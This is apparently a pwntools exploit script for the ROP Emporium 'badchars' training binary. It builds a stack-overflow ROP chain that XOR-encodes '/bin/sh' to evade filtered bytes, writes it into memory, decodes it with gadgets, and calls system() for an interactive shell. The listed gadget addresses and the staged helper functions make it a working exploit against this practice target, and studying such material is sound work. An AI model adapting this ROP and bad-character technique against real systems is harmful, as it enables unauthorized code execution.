from pwn import *
import struct

p = process("./badchars")

def cycle_rip():
    payload = cyclic(1000)
    print(p.recv())
    print("DEBUG: b *pwnme+233")
    print("Send payload?")
    input()
    p.sendline(payload)
    p.recv()
    input()
    '''
    #to check input
    $ python
    > from pwn import *
    > cyclic_find(b'kaaa')
    40
    '''

def snipe_rip():
    payload = b'A'*40 
    payload += b'B'*8 #RIP
    print(p.recv())
    print("DEBUG: b *pwnme+233")
    print("Send payload?")
    input()
    p.sendline(payload)
    p.recv()
    input()

def straight_to_system():
    payload = b'A'*40 
    '''
    objdump -d badchar > obd.txt
    grep "useful" obd.txt
        4009e8:       e8 03 fd ff ff          callq  4006f0 <system@plt>
    '''
    payload += struct.pack('Q', 0x00000000004009e8)#RIP
    payload += b'/bin/sh' + b'\x00'
    print(p.recv())
    print("DEBUG: b *pwnme+233")
    print("Send payload?")
    input()
    p.sendline(payload)
    input()

'''
0000000000400b30 <usefulGadgets>:
  400b30:	45 30 37             	xor    %r14b,(%r15)
  400b33:	c3                   	retq   
  400b34:	4d 89 65 00          	mov    %r12,0x0(%r13)
  400b38:	c3                   	retq   
  400b39:	5f                   	pop    %rdi
  400b3a:	c3                   	retq   
  400b3b:	41 5c                	pop    %r12
  400b3d:	41 5d                	pop    %r13
  400b3f:	c3                   	retq   
  400b40:	41 5e                	pop    %r14
  400b42:	41 5f                	pop    %r15
  400b44:	c3                   	retq   
  400b45:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  400b4c:	00 00 00 
  400b4f:	90                   	nop
'''

def chars_to_addr(chars, addr):
    pop_r12_pop_r13_ret = struct.pack('Q', 0x0000000000400b3b)
    mov_pr13_r12_ret = struct.pack('Q', 0x0000000000400b34)
    payload = pop_r12_pop_r13_ret
    payload += chars
    payload += struct.pack('Q', addr)
    payload += mov_pr13_r12_ret
    return payload

def xor_addr(addr, xor_key, n_bytes):
    pop_r14_pop_r15_ret = struct.pack('Q', 0x0000000000400b40)
    pop_r15_ret = struct.pack('Q', 0x0000000000400b42)
    xor_pr15_r14b_ret = struct.pack('Q', 0x0000000000400b30)
    payload = pop_r14_pop_r15_ret
    payload += struct.pack('Q',xor_key)
    payload += struct.pack('Q',addr)
    for i in range(n_bytes):
        payload += pop_r15_ret
        payload += struct.pack('Q',addr + i)
        payload += xor_pr15_r14b_ret
    return payload
    
def xor_the_string():
    pop_rdi_ret = struct.pack('Q', 0x0000000000400b39)
    system = struct.pack('Q', 0x00000000004009e8)
    string = b'/bin/sh'
    xor_key = 0x43 #Just choose a key that doesnt cause XOR collisions with bad chars
    xor_string = bytes(''.join([chr(x ^ xor_key) for x in string]), 'utf-8')
    xor_string += b'\x00'
    payload = b'A'* 40 
    writing_addr = 0x601000
    payload += chars_to_addr(chars=xor_string, addr=writing_addr)
    payload += xor_addr(writing_addr, xor_key, n_bytes=7) 
    payload += pop_rdi_ret
    payload += struct.pack('Q',writing_addr)
    payload += system
    print(p.recv())
    print("DEBUG: b *usefulFunction+9")
    print("Send payload?")
    input()
    p.sendline(payload)
    print("DEBUG: x/s $rdi")
    input()

def pwnage():
    pop_rdi_ret = struct.pack('Q', 0x0000000000400b39)
    system = struct.pack('Q', 0x00000000004009e8)
    string = b'/bin/sh'
    xor_key = 0x43 #Just choose a key that doesnt cause XOR collisions with bad chars
    xor_string = bytes(''.join([chr(x ^ xor_key) for x in string]), 'utf-8')
    xor_string += b'\x00'
    payload = b'A'* 40 
    writing_addr = 0x601000
    payload += chars_to_addr(chars=xor_string, addr=writing_addr)
    payload += xor_addr(writing_addr, xor_key, n_bytes=7) 
    payload += pop_rdi_ret
    payload += struct.pack('Q',writing_addr)
    payload += system
    print(p.recv())
    p.sendline(payload)
    print("Go interactive?")
    input()
    p.interactive()

if __name__=='__main__':
    #cycle_rip()
    #snipe_rip()
    #straight_to_system()
    #xor_the_string()
    pwnage()
